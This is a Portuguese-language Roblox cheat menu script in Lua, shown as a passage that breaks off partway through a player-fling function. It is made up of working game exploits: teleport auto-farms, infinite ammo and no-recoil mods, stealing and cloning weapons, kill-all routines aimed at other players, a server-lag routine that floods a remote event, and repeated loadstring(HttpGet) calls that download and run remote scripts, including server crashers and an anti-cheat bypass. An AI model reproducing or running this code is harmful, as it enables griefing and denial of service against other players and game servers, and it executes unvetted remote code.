        PremiumOnly = false      
    })
    local PlayersTab = Window:MakeTab({
        Name = "Players",
        Icon = "rbxassetid://7743876054",
        PremiumOnly = false  
    })
    local ArmaTab = Window:MakeTab({
        Name = "Weapon",
        Icon = "rbxassetid://14511894009",
        PremiumOnly = false     
    })
    local EspTab = Window:MakeTab({
        Name = "Visual",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false              
    })  
	local KillTab = Window:MakeTab({
        Name = "Kill all",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false      
    })     
    local TrollTab = Window:MakeTab({
        Name = "Destruição",
        Icon = "rbxassetid://14511996964",
        PremiumOnly = false      
    })    
    local MenusTab = Window:MakeTab({
        Name = "Menus",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false         
    })    
    local HubTab = Window:MakeTab({
        Name = "Hub Trolls",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false                
    })    
    local BypassTab = Window:MakeTab({
        Name = "Anti Cheat",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false                    
    })    
    local RoleplayTab = Window:MakeTab({
        Name = "Acs Roleplay",
        Icon = "rbxassetid://14511996964",
        PremiumOnly = false      
    })    
    local CarroTab = Window:MakeTab({
        Name = "Veiculos",
        Icon = "rbxassetid://7733708835",
        PremiumOnly = false                        
    })    
    local AdmTab = Window:MakeTab({
        Name = "Staff",
        Icon = "rbxassetid://14511996964",
        PremiumOnly = false    
    })    
--Pontos
local plr = game.Players.LocalPlayer
local char = plr.Character




--Funcao farm teleporte favela do batata


function TeleportBaseTR1()
    char.HumanoidRootPart.CFrame = CFrame.new(-1380.51526, 29.3764763, 1138.62524, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end

function TeleportBaseTR2()
    char.HumanoidRootPart.CFrame = CFrame.new(-1448.61536, 28.8764763, 1222.62524, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end

function TeleportBaseTR3()
    char.HumanoidRootPart.CFrame = CFrame.new(-2719.37646, 0.714344025, -97.993187, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end

function TeleportBaseTR4()
    char.HumanoidRootPart.CFrame = CFrame.new(-2775.80005, 26.1462669, -71.699173, 1, 0, 0, 0, 0.726554513, -0.687108874, 0, 0.687108874, 0.726554513)
end


--Abas Farm

local plrTab = Window:MakeTab({
    Name = "Farm",
    Icon = "rbxassetid://14512014916",
    PremiumOnly = false
})

local Section = plrTab:AddSection({
    Name = "Farm - Favela do batata (USEM EM 5 SEGUNDOS SEMPRE)"
})

plrTab:AddButton({
    Name = "Pegar lixo - Favela do batata",
    Callback = function()
        TeleportBaseTR1()
    end
})

plrTab:AddButton({
    Name = "Entregar lixo - Favela do batata",
    Callback = function()
        TeleportBaseTR2()
    end
})plrTab:AddButton({
    Name = "Pegar cimento - Favela do batata",
    Callback = function()
        TeleportBaseTR3()
    end
})plrTab:AddButton({
    Name = "Entregar cimento - Favela do batata",
    Callback = function()
        TeleportBaseTR4()
    end
})
    local ConfigTab = Window:MakeTab({
        Name = "Settings",
        Icon = "rbxassetid://7734053495",
        PremiumOnly = false                                  
    })
    local Section = JogadorTab:AddSection({
        Name = "Alterador de Speed/Pulo"
    })
local Section = ConfigTab:AddSection({
	Name = "Bind Menu"
})
ConfigTab:AddBind({
	Name = "Bind Menu",
	Default = Enum.KeyCode.E,
	Hold = false,
	Callback = function()
		print("press")
	end  
})
local Section = ConfigTab:AddSection({
	Name = "Opcoes basicas"
})
ConfigTab:AddButton({
	Name = "Rejoin",
	Callback = function()
        local PLR_SERVICE = game:GetService('Players')
        local TELEPORT_SERVICE = game:GetService('TeleportService')
        if #PLR_SERVICE:GetPlayers() <= 1 then
            PLR_SERVICE.LocalPlayer:Kick('\nRejoining...')
            wait()
            TELEPORT_SERVICE:Teleport(game.PlaceId, PLR_SERVICE.LocalPlayer)
        else
            TELEPORT_SERVICE:TeleportToPlaceInstance(game.PlaceId, game.JobId, PLR_SERVICE.LocalPlayer)
        end
  	end    
})
ConfigTab:AddButton({
	Name = "Auto Rejoin",
	Callback = function()
        local PLR_SERVICE = game:GetService('Players')
        local TELEPORT_SERVICE = game:GetService('TeleportService')
        local CORE_SERVICE = game:GetService('CoreGui')
        local DIR = CORE_SERVICE:FindFirstChild('RobloxPromptGui'):FindFirstChild('promptOverlay')
        DIR.DescendantAdded:Connect(function(Err)
            if Err.Name == 'ErrorTitle' then
                Err:GetPropertyChangedSignal('Text'):Connect(function()
                    if Err.Text:sub(0, 12) == 'Disconnected' then
                        if #PLR_SERVICE:GetPlayers() <= 1 then
                            PLR_SERVICE.LocalPlayer:Kick('\nRejoining...')
                            wait()
                            TELEPORT_SERVICE:Teleport(game.PlaceId, PLR_SERVICE.LocalPlayer)
                        else
                            TELEPORT_SERVICE:TeleportToPlaceInstance(game.PlaceId, game.JobId, PLR_SERVICE.LocalPlayer)
                        end
                    end
                end)
            end
        end)
  	end    
})
ConfigTab:AddColorpicker({
	Name = "Colorpicker",
	Default = Color3.fromRGB(255, 0, 0),
	Callback = function(Value)
		print(Value)
	end	  
})
ConfigTab:AddButton({
	Name = "Alterar Cursor",
	Callback = function()
        local mouse = game.Players.LocalPlayer:GetMouse()
 
        mouse.Icon = "rbxassetid://5992580992"
  	end    
})
local Section = ArmaTab:AddSection({
	Name = "Weapon Hacks"
    })
    ArmaTab:AddButton({
        Name = "Inf Ammo",
        Callback = function()
            _G.Damage = 1003
_G.FireRate = 0
_G.Clips = 999999
_G.AmmoInClip = 999999
_G.Auto = true
 
 
--\\ Load string By Pedroxz

loadstring(game:HttpGet("https://raw.githubusercontent.com/RIPExploit/23452tr2t423t3t34tg34gg/master/ryewifwfripexloit.lua", true))()
        end    
})
ArmaTab:AddButton({
    Name = "Puxar armas",
    Callback = function()
        for i, v in pairs(game:GetDescendants()) do
            if v:IsA('Tool') then
                v.Parent = game:GetService('Players').LocalPlayer.Backpack
            end
        end
        
        game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
            for i, v in pairs(game:GetService('Players').LocalPlayer.Backpack:GetDescendants()) do
                if v:IsA('Tool') then
                    v.Parent = game:GetService('Teams')
                end
            end
            for i, v in pairs(game:GetService('Players').LocalPlayer.Character:GetDescendants()) do
                if v:IsA('Tool') then
                    v.Parent = game:GetService('Teams')
                end
            end
        end)
      end    
})
ArmaTab:AddButton({
	Name = "Puxar Armas 1 Indetectável",
	Callback = function()
        for i,v in game.Players:GetDescendants() do
            if v:IsA("Tool") then
            v.Parent = game.Players.LocalPlayer.Backpack
            end
            end
  	end    
})
ArmaTab:AddButton({
    Name = "Clonar Items",
    Callback = function()
        local function ClonarTool(tool, player)
            local backpack = player:WaitForChild("Backpack")
            local clonedTool = tool:Clone()
            clonedTool.Parent = backpack
        end
        
        local function procurarTools()
            local player = game.Players.LocalPlayer
        
            for _, tool in pairs(game:GetDescendants()) do
                if tool:IsA("Tool") then
                    ClonarTool(tool, player)
                end
            end
        end
        
        procurarTools()
      end    
})
local Section = KillTab:AddSection({
	Name = "Kill Options"
}) 
KillTab:AddButton({
	Name = "Kill All ACS - Weapon",
	Callback = function()
        game.StarterGui:SetCore("SendNotification", {
            Title = "Kill all Hack"; 
            Text = "By Pedroxz";
            Icon = "rbxassetid://57254792"; 
            
            Duration = 5; 
            })
            --- script 
            _G.Stop = false
             
            repeat game:GetService("RunService").RenderStepped:Wait()
            for _,v in next, game:GetService("Players"):GetPlayers() do
            if v ~= game:GetService("Players").LocalPlayer then
            local char = v.Character or workspace:FindFirstChild(v.Name)
            if char then
            pcall(function()
            char.Head.Anchored = true
            char.Head.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,2,-2.5)
            end)
            end
            end
            end
            until _G.Stop
  	end    
})
ArmaTab:AddButton({
	Name = "Menu De Armas ACS",
	Callback = function()
        xpcall(function()
            local Player = game.Players.LocalPlayer
            local Storage = game.ReplicatedStorage
            local Teams = game:GetService("Teams")
            local Undo,Guns,MCache = {},{},{}
            
            function ChildrenOfTool(gc)
                local total = 0
                for i,v in next, gc do
                    if v:IsA("Tool") then
                        total = total + 1
                    end
                end
                
                return total
            end
            
            -- GUI
            local _raw
            local _liblink = "https://raw.githubusercontent.com/loglizzy/Elerium-lib/main/lib.min.lua"
            if isfile and readfile then
                if isfile("log-Elerium.lib") then
                    _raw = readfile("log-Elerium.lib")
                else
                    _raw = game:HttpGet(_liblink)
                    writefile("log-Elerium.lib", _raw)
                end
            else
                _raw = game:HttpGet(_liblink)
            end
            
            local Library = loadstring(_raw)()
            local Window,WRender = Library:AddWindow("Racismo 2.0.1 [BETA]", {
                main_color = Color3.fromRGB(45, 45, 45),
                min_size = Vector2.new(350, 600),
                toggle_key = Enum.KeyCode.RightShift,
                can_resize = true,
            })
            
            WRender.ImageColor3 = Color3.fromRGB(55,55,55)
            
            -- UI funcs
            function switch(self, data, state)
                local gun,old = self.gun,self.old
                for i,v in next, data do
                    Guns[gun][i] = state and v or old[i]
                end
            end
            
            function FoldInto(tab,t,cl)
                local gc = t:GetChildren()
                local folder,render
                
                local len = ChildrenOfTool(gc)
                if len > 0 then
                    folder,render = tab:AddFolder(
                        ' <b><font color="rgb(180,180,180)">'..len..'</font></b>  '
                        ..t.Name
                    )
                    
                    render.Button.RichText = true
                    if t:IsA("Team") or cl then
                        render.ImageColor3 = cl or t.TeamColor.Color
                        render.ImageTransparency = 0.6
                        render.Button.TextButton_Roundify_4px.Visible = false
                    end
                    
                    for i,v in next, gc do
                        if not v:IsA("Tool") then continue end
                        
                        if v:FindFirstChild("ACS_Settings") then
                            Guns[v] = require(v.ACS_Settings)
                            local old = {}
                            for i,v in next, Guns[v] do
                                old[i] = v
                            end
                            
                            MCache[v] = {gun=v, old=old, switch=switch}
                        end
                        
                        folder:AddSwitch(v.Name, function(s)
                            Undo[v] = s and t
                            v.Parent = s and Player.Backpack or t
                        end)
                    end
                end
                
                return folder,render
            end
            
            -- Tools Tab
            local Tools = Window:AddTab("Times")
            for i,t in next, Teams:GetChildren() do
                FoldInto(Tools, t)
            end
            
            Tools:Show()
            
            -- Geral
            local Geral = Window:AddTab("Geral")
            
            FoldInto(Geral, Storage)
            function _foldloop(v)
                for i,t in next, v:GetChildren() do
                    FoldInto(Geral, t)
                    if t:IsA("Folder") then
                        _foldloop(t)
                    end
                end
            end
            
            _foldloop(Storage)
            
            -- ACS mods
            local Mods = Window:AddTab("Mods")
            
            local ACS = Mods:AddFolder("ACS")
            ACS:AddSwitch("Munição Infinita", function(state)
                for i,v in next, MCache do
                    v:switch({
                        Ammo = math.huge,
                        StoredAmmo = math.huge,
                        AmmoInGun = math.huge
                    }, state)
                end
            end)
            
            ACS:AddSwitch("Sem recuo", function(state)
                for i,v in next, MCache do
                    v:switch({
                        MaxRecoilPower = 0,
                        camRecoil = {
                            camRecoilRight={0,0},camRecoilUp={0,0},
                            camRecoilLeft={0,0},camRecoilTilt={0,0}
                        }
                    }, state)
                end
            end)
            
            ACS:AddSwitch("Sem dispersão de balas", function(state)
                for i,v in next, MCache do
                    v:switch({
                        MaxSpread = 0
                    }, state)
                end
            end)
            
            ACS:AddSwitch("Sem emperragem", function(state)
                for i,v in next, MCache do
                    v:switch({
                        CanBreak = false
                    }, state)
                end
            end)
            
            ACS:AddSwitch("Sem gravidade em balas", function(state)
                for i,v in next, MCache do
                    v:switch({
                        CanBreak = false
                    }, state)
                end
            end)
            
            ACS:AddSlider("Tiros em rajada", function(num)
                for i,v in next, MCache do
                    Guns[v.gun].BurstShot = num
                end
            end,{min = 2, max = 10})
            
            local Modes = ACS:AddFolder("Modos de tiro")
            local _modes = {ChangeFiremode = true, Auto=false, Burst=false, Semi=true}
            
            Modes:AddSwitch("Automatico", function(state)
                _modes["Auto"] = state
                for i,v in next, MCache do
                    v:switch({
                        FireModes = _modes
                    }, state)
                end
            end)
            
            Modes:AddSwitch("Rajada", function(state)
                _modes["Burst"] = state
                for i,v in next, MCache do
                    v:switch({
                        FireModes = _modes
                    }, state)
                end
            end)
            
            Modes:AddSwitch("Semi", function(state)
                _modes["Semi"] = state
                for i,v in next, MCache do
                    v:switch({
                        FireModes = _modes
                    }, state)
                end
            end)
            
            -- NoCol mods
            local NOC = Mods:AddFolder("NoCol")
            
            -- Backpack Undo
            function OnChar(char)
                char:WaitForChild("Humanoid").Died:wait()
                for i,v in next, Undo do
                    if v then i.Parent = Player.Backpack end
                end
                
                Player.CharacterAdded:wait()
                for i,v in next, Undo do
                    if v then i.Parent = Player.Backpack end
                end
            end
            
            Player.CharacterAdded:connect(OnChar)
            OnChar(Player.Character or Player.CharacterAdded:wait())
            end,print)
  	end    
})
local Section = CarroTab:AddSection({
	Name = "Veiculos"
})
CarroTab:AddButton({
	Name = "Reparar Veiculo (acs nova)",
	Callback = function()
        wait(0.2)
        game.StarterGui:SetCore("SendNotification", {
        Title = "Veiculo Reparado!"; -- the title 
        Text = "Reparado com sucesso!"; -- what the text says 
        Duration = 5; -- how long the notification should in secounds
        })
  	end
})
CarroTab:AddButton({
	Name = "Tp Veiculo",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/G-development-M/DreckModz/main/By_dreck_/TpCarrosCadeiras.lua'))()
  	end        
})
local Section = CarroTab:AddSection({
	Name = "Puxador"
})
CarroTab:AddButton({
	Name = "Puxar Carro - Eb do Tevez",
	Callback = function()
        for _, v: string in ipairs({'Tesla', 'Impala', 'Kombi'}) do
            game.ReplicatedStorage:WaitForChild("Remotes").Garagem:FireServer(v, "CV")
        end
  	end    
})
CarroTab:AddButton({
	Name = "Selection Carro - Eb Do Tevez",
	Callback = function()
        local Plr = game.Players.LocalPlayer
        type ret = ModuleScript
        local function GetIconModule():ret
            for _, instance in game.ReplicatedStorage:GetDescendants() do
                if instance:IsA("ModuleScript") and instance.Name == "Icon" then
                    return instance, true
                end
            end
            return "Icone não achado.", false
        end
        
        local Icon, Sucess = GetIconModule()
        
        
        if not Sucess then return end
        
        local Module = require(Icon)
        
        local NewIcon = Module.new()
            :setLabel("Spawnar carro")
            :setImage(14268537581)
            :notify()
            :setTip("Abrir menu de spawnar carro")
            :setDropdown({
                
                Module.new()
                :setLabel("Spawnar Kombi")
                :setProperty("deselectWhenOtherIconSelected", true)
                :bindEvent("selected",function()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Sistema";
                    Text = "Sua kombi foi spawnada na garagem."
                })
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Garagem"):FireServer("Kombi", "CV")
                end);
        
                Module.new()
                :setLabel("Spawnar Impala")
                :setProperty("deselectWhenOtherIconSelected", true)
                :bindEvent("selected",function()
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "Sistema";
                        Text = "Sua Impala foi spawnada na garagem."
                    })
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Garagem"):FireServer("Impala", "CV")
                end);
        
                Module.new()
                :setLabel("Spawnar Tesla")
                :setProperty("deselectWhenOtherIconSelected", true)
                :bindEvent("selected",function()
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "Sistema";
                        Text = "Sua Tesla foi spawnada na garagem."
                    })
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Garagem"):FireServer("Tesla", "CV")
                end);
                
                
                Module.new()
                :setLabel(string.format("Feito por Pedroxz63", "Hypee"))
                :lock()
            })        
  	end    
})
local Section = CarroTab:AddSection({
	Name = "Option Veiculo"
})
CarroTab:AddButton({
	Name = "God Mode Veiculo",
	Callback = function()
        godmode = true
 
        game:GetService('RunService').Stepped:connect(function()
            if godmode == true then
                if game.Players.LocalPlayer.Character ~= nil then
                    if game.Players.LocalPlayer.Character:FindFirstChild("Right Leg") then
                        game.Players.LocalPlayer.Character:FindFirstChild("Right Leg"):Destroy()
                    end
                end
            end
            end)
         
         
        game.Players.LocalPlayer.Chatted:Connect(function(msg)
        local lower = string.lower(msg)
         
        if string.find(lower,";god") then
            godmode = true       
        game.Players.LocalPlayer.Character:BreakJoints()
        end
         
        if string.find(lower,";ungod") then
            godmode = false      
        game.Players.LocalPlayer.Character:BreakJoints()
        end
        end)
        --[[
        Made by Link
        --]]
        
  	end    
})
CarroTab:AddButton({
	Name = "Veiculo Fly",
	Callback = function()
        local ScreenGui = Instance.new("ScreenGui")
        local main = Instance.new("Frame")
        local flycar = Instance.new("TextButton")
        local Close = Instance.new("TextButton")
        local openmain = Instance.new("Frame")
        local open = Instance.new("TextButton")
         
        ScreenGui.Parent = game.CoreGui
         
        main.Name = "Flying Car"
        main.Parent = ScreenGui
        main.BackgroundColor3 = Color3.fromRGB(112, 255, 133)
        main.Position = UDim2.new(0.0598930493, 0, 0.716088295, 0)
        main.Size = UDim2.new(0, 120, 0, 108)
        main.Visible = false
        main.Active = true
        main.Draggable = true
         
        flycar.Name = "CarV1"
        flycar.Parent = main
        flycar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        flycar.Position = UDim2.new(0, 0, 0.268518507, 0)
        flycar.Size = UDim2.new(0, 120, 0, 50)
        flycar.Style = Enum.ButtonStyle.RobloxButton
        flycar.Font = Enum.Font.Gotham
        flycar.Text = "Car Fly Pedroxz"
        flycar.TextColor3 = Color3.fromRGB(85, 170, 255)
        flycar.TextSize = 14.000
        flycar.MouseButton1Click:connect(function()
            local Tool = Instance.new("HopperBin")
        Tool.Parent = game.Players.LocalPlayer.Backpack
        Tool.Name = "กดปุ่ม R บิน"
        local hint = Instance.new("Hint",game.Players.LocalPlayer.PlayerGui)
           hint.Text = "Car Fly Pedroxz"
           hint.Name = game.JobId
        repeat wait()
            until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
        local mouse = game.Players.LocalPlayer:GetMouse()
        repeat wait() until mouse
        local plr = game.Players.LocalPlayer
        local torso = plr.Character.Torso
        local flying = true
        local deb = true
        local ctrl = {f = 0, b = 0, l = 0, r = 0}
        local lastctrl = {f = 0, b = 0, l = 0, r = 0}
        local maxspeed = 200
        local speed = 0
         
        function Fly()
        local bg = Instance.new("BodyGyro", torso)
        bg.P = 9e4
        bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        bg.cframe = torso.CFrame
        local bv = Instance.new("BodyVelocity", torso)
        bv.velocity = Vector3.new(0,0.1,0)
        bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
        repeat wait()
        plr.Character.Humanoid.PlatformStand = false
        if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
        speed = speed+125.0+(speed/maxspeed)
        if speed > maxspeed then
        speed = maxspeed
        end
        elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
        speed = speed-250
        if speed < 0 then
        speed = 0
        end
        end
        if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
        bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
        lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
        elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
        bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
        else
        bv.velocity = Vector3.new(0,0.1,0)
        end
        bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
        until not flying
        ctrl = {f = 0, b = 0, l = 0, r = 0}
        lastctrl = {f = 0, b = 0, l = 0, r = 0}
        speed = 0
        bg:Destroy()
        bv:Destroy()
        plr.Character.Humanoid.PlatformStand = false
        end
        mouse.KeyDown:connect(function(key)
        if key:lower() == "r" then
        if flying then flying = false
        else
        flying = true
        Fly()
        end
        elseif key:lower() == "w" then
        ctrl.f = 1
        elseif key:lower() == "s" then
        ctrl.b = -1
        elseif key:lower() == "a" then
        ctrl.l = -1
        elseif key:lower() == "d" then
        ctrl.r = 1
        end
        end)
        mouse.KeyUp:connect(function(key)
        if key:lower() == "w" then
        ctrl.f = 0
        elseif key:lower() == "s" then
        ctrl.b = 0
        elseif key:lower() == "a" then
        ctrl.l = 0
        elseif key:lower() == "d" then
        ctrl.r = 0
        end
        wait(5)
        hint:Destroy()
        end)
        Fly()
        end)    
         
         
        Close.Name = "Close"
        Close.Parent = main
        Close.BackgroundColor3 = Color3.fromRGB(255, 32, 140)
        Close.Position = UDim2.new(0.675000012, 0, 0, 0)
        Close.Size = UDim2.new(0, 39, 0, 29)
        Close.Text = "X"
        Close.TextColor3 = Color3.fromRGB(0, 0, 0)
        Close.TextSize = 14.000
        Close.MouseButton1Down:connect(function()
        main.Visible = false
        openmain.Visible = true
        end)
         
        openmain.Name = "openmain"
        openmain.Parent = ScreenGui
        openmain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        openmain.Position = UDim2.new(0.00641711242, 0, 0.54574132, 0)
        openmain.Size = UDim2.new(0, 100, 0, 26)
        openmain.Active = true
        openmain.Draggable = true
         
        open.Name = "open"
        open.Parent = openmain
        open.BackgroundColor3 = Color3.fromRGB(255, 177, 42)
        open.Size = UDim2.new(0, 100, 0, 26)
        open.Text = "Car Fly Pedroxz"
        open.TextColor3 = Color3.fromRGB(0, 0, 0)
        open.TextSize = 14.000
        open.MouseButton1Down:connect(function()
        openmain.Visible = false
        main.Visible = true
        end)
         
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Car Fly Pedroxz";
        Text = [[Car Fly Pedroxz
            Car Fly Pedroxz :D 
            555555555]];
        })
  	end    
})
local Section = ArmaTab:AddSection({
	Name = "Premium"
})
ArmaTab:AddButton({
    Name = "Rapid Fire",
    Callback = function()
        for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
			if v:IsA("ModuleScript") and v.Name == "Settings" then
				local a = require(v)
				a.Bullets = 9
				a.Mode = "Auto"
				a.VRecoil = {0,0}
				a.HRecoil = {0,0}
				a.Distance = 100000000
				a.BDrop = 0
				a.RandomTracer = false
				a.TracerEveryXShots = 1
				a.FireRate = 950
				a.FocusOnSight = true
				for i,v in pairs(a) do
					print(i,v) 
				end 
			end 
		end
    end   
})  
ArmaTab:AddButton({
	Name = "Sem Recuo",
	Callback = function()
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/turtle"))()
        library.flags = { }
        local nr = library:Window("No Recoil")
        
        
        library.flags["value_1"] = 1
        library.flags["value_2"] = 1
        library.flags["value_3"] = 1
        
        nr:Slider("Value 1", 1, 10, 1, function(value)
          library.flags["value_1"] = value
        end)
        nr:Slider("Value 2", 1, 100, 1, function(value)
          library.flags["value_2"] = value
        end)
        nr:Slider("Value 3", 1, 10, 1, function(value)
          library.flags["value_3"] = value
           
        end)
        
        
        local old
        old = hookfunction(math.random, function(...)
           local args = {...}
        
           -- handle if no args, math.random() (0, 1.0)
           if args[1] == nil then
               return old() / library.flags["value_1"]
           end
        
           -- handle if upper bound. math.random(10) (1, 10)
           if args[2] == nil then
               return old(args[1] / library.flags["value_2"])
           end
        
           -- handle if lower and upper bound. math.random(-5, 5) (-5, 5)
        
           return old(args[1], args[2] / library.flags["value_3"])
        end)
  	end    
})
local Section = PlayersTab:AddSection({
	Name = "ACS Hub"
    })
    PlayersTab:AddButton({
        Name = "Parvus Hub",
        Callback = function()
            local IsDevelopmentBranch,NotificationTime = false,5
local Branch = IsDevelopmentBranch and "development" or "main"
local Source = "https://raw.githubusercontent.com/AlexR32/Parvus/" .. Branch .. "/"
loadstring(game:HttpGet(Source .. "Loader.lua"),"Loader")(Branch,NotificationTime)
          end
    })
    PlayersTab:AddButton({
        Name = "ACS Hub V1",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/StoneDev47/KLB-HUB---ACS/main/mainhub", true))()
          end
    })
local Section = TrollTab:AddSection({
	Name = "Crashers"
})
    TrollTab:AddButton({
        Name = "Crash Server 1",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/arandomuser0/scriptroblox/main/tarantula1.lua"))()
          end 
    })
    TrollTab:AddButton({
        Name = "Lag Server",
        Callback = function()
            local char = game:GetService('Players').LocalPlayer.Character or nil
if char then
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(0.6) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end

local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}

table.insert(spammedtable, {})
z = spammedtable[1]

for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end

local calculatemax = getmaxvalue(tableincrease)
local maximum

if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end

for i = 1, maximum do
     table.insert(maintable, spammedtable)
end

for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end

bomb(250, 2) --// change values if client crashes
end

          end 
    })
    local Section = TrollTab:AddSection({
        Name = "Troll"
    })
    TrollTab:AddButton({
        Name = "Lagar servidor Models",
        Callback = function()
            loadstring(game:HttpGet(("https://raw.githubusercontent.com/GameLeaks2/RobloxScripts/main/CrashServer"),true))()
          end   
        })
local Section = plrTab:AddSection({
	Name = "Cda"
})

    plrTab:AddButton({
        Name = "Auto farm Cidade Alta V1",
        Callback = function()
            local player = game.Players.LocalPlayer
local hum = player.Character:FindFirstChild("Humanoid")
local seat = hum.SeatPart
shared.a = not shared.a

if seat == nil then
    game.StarterGui:SetCore("SendNotification",{
        Title = "V2",
        Text = "Senta na cadeira pra comecar o farm!"
    })
    return
end

while shared.a and hum.Sit do
    local click = seat.Parent:WaitForChild("Sacola"):FindFirstChildOfClass("ClickDetector")
    fireclickdetector(click)
    task.wait()
end
          end   
        })
local Section = plrTab:AddSection({
	Name = "Eb farm"
})
plrTab:AddButton({
    Name = "Auto Farm @Kauezindo_Eb",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/arandomuser0/scriptroblox/main/autofarmeb.lua'))()
      end   
    })
    TrollTab:AddButton({
        Name = "Hub troll v1.5",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Arthurkla/teste/main/ViethinScript2", true))()
          end   
    })
    KillTab:AddButton({
        Name = "Kill all V2 (Manual)",
        Callback = function()
            local p = game.Players.LocalPlayer
local number = 2
local value = true -- true ou false / Se estiver true, ele vai puxar somente as pessoas que não sejam da sua Team, se for false, ele vai puxar todos os players do mapa

for _, player in pairs(game.Players:GetChildren()) do
    if value then
        if player.Character:FindFirstChild("HumanoidRootPart") and player.Team.Name ~= p.Team.Name then
        number += 2
player.Character.Head.Anchored = true
player.Character.Head.Position = p.Character.HumanoidRootPart.Position + p.Character.HumanoidRootPart.CFrame.LookVector * number
        end
    else
        if player.Character:FindFirstChild("HumanoidRootPart") and player.Name ~= p.Name then
    number += 2
player.Character.Head.Anchored = true
player.Character.Head.Position = p.Character.HumanoidRootPart.Position + p.Character.HumanoidRootPart.CFrame.LookVector * number
        end
    end
end
          end   
        })
    KillTab:AddButton({
        Name = "Kill All (Remote Event)",
        Callback = function()
            local p = game.Players.LocalPlayer
local number = 2
local value = true -- true ou false / Se estiver true, ele vai puxar somente as pessoas que não sejam da sua Team, se for false, ele vai puxar todos os players do mapa

for _, player in pairs(game.Players:GetChildren()) do
    if value then
        if player.Character:FindFirstChild("HumanoidRootPart") and player.Team.Name ~= p.Team.Name then
        number += 2
player.Character.Head.Anchored = true
player.Character.Head.Position = p.Character.HumanoidRootPart.Position + p.Character.HumanoidRootPart.CFrame.LookVector * number
        end
    else
        if player.Character:FindFirstChild("HumanoidRootPart") and player.Name ~= p.Name then
    number += 2
player.Character.Head.Anchored = true
player.Character.Head.Position = p.Character.HumanoidRootPart.Position + p.Character.HumanoidRootPart.CFrame.LookVector * number
        end
    end
end

          end   
        })
    TrollTab:AddButton({
        Name = "Hub Super Troll - Bypass",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/i4mitty/Peruanito.exe/main/Peruanito.exe.lua"))()
          end   
})
local Section = TrollTab:AddSection({
	Name = "Aba Trollzin"
})
TrollTab:AddButton({
	Name = "Fling Player",
	Callback = function()
		local lp = game:FindService("Players").LocalPlayer
 
local function gplr(String)
	local Found = {}
	local strl = String:lower()
	if strl == "all" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			table.insert(Found,v)
		end
	elseif strl == "others" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name ~= lp.Name then
				table.insert(Found,v)
			end
		end 
	elseif strl == "me" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name == lp.Name then
				table.insert(Found,v)
			end
		end 
	else
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name:lower():sub(1, #String) == String:lower() then
				table.insert(Found,v)
			end
		end 
	end
